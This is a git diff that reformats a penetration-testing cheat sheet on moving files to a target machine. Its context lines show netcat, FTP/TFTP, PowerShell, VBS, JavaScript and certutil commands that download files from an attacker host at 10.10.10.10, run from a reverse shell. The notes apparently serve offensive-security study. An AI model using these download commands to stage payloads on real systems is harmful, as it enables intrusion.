@@ -1,7 +1,8 @@
 # File Transferring
 
 ## Via NetCat
-  - Using NetCat
+
+* Using NetCat
 
 ```bash
 #On the Receiving Machine
@@ -10,11 +11,10 @@ nc -l -p 9999 > received_file.txt
 #On the Sending Machine
 nc 10.10.10.10 9999 < received_file.txt
 ```
- 
 
 ## Via FTP
 
-  - Using FTP
+* Using FTP
 
 ```bash
 # In Kali
@@ -33,7 +33,7 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
 
-  - Using TFTP
+* Using TFTP
 
 ```bash
 # In Kali
@@ -45,7 +45,7 @@ tftp -i 10.10.10.10 GET file.txt
 
 ## Via HTTP
 
-  - Using basic commands
+* Using basic commands
 
 ```bash
 # In Kali
@@ -58,7 +58,7 @@ wget 10.10.10.10/file
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
 ```
 
-  - Using VBS (Windows)
+* Using VBS \(Windows\)
 
 ```bash
 # In reverse shell
@@ -92,7 +92,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://10.10.10.10/file.exe file.exe
 ```
 
-  - Using javascript (Windows)
+* Using javascript \(Windows\)
 
 ```bash
 # In Kali
@@ -111,7 +111,7 @@ echo BinStream.SaveToFile("file.txt"); >> wget.js
 cscript /nologo wget.js http://10.10.10.10/file.txt
 ```
 
-  - Using Certutil (Windows)
+* Using Certutil \(Windows\)
 
 ```bash
 # In Kali
